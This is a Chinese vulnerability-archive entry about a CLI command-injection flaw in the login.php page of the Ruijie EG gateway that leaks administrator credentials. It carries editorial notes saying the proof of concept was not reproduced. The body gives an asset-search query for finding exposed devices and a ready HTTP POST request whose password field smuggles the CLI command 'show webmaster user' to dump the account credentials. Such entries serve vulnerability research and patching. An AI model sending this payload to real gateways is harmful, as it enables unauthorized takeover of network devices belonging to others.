---
version: "锐捷EG易网关"
source: "wy876 漏洞文库"
id: "vw-0e27f993ffc80eebbf9db42a"
entity_id: "ve-0e27f993ffc80eebbf9db42a"
schema_version: "1"
title: "锐捷 EG易网关管理员账号密码泄露漏洞"
product: "Ruijie EG易网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未认证登录接口，需支持该CLI拼接；固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ewl6ikmuyvguq1ps"
source_status: "recorded"
---

# 锐捷 EG易网关管理员账号密码泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie EG易网关
- 本文讨论：login.php password CLI注入泄露账号
- 版本、权限与配置前提：未认证登录接口，需支持该CLI拼接；固件未知
- 资料类型：凭据泄露PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 请求明确而无返回/源码/版本，用户名admin是否必要未写
- 与734735736前置步骤相同，应成为其独立关联实体；不同于a=version
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 是否需要默认密码/问号语义/影响范围待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

```java
锐捷EG易网关
```

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

```java
app="Ruijie-EG易网关"
```

<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">●登录页面</font>


<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**<font style="color:rgb(38, 38, 38);"></font>

```http
POST /login.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user
```

<font style="color:rgb(38, 38, 38);">  
</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewl6ikmuyvguq1ps>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
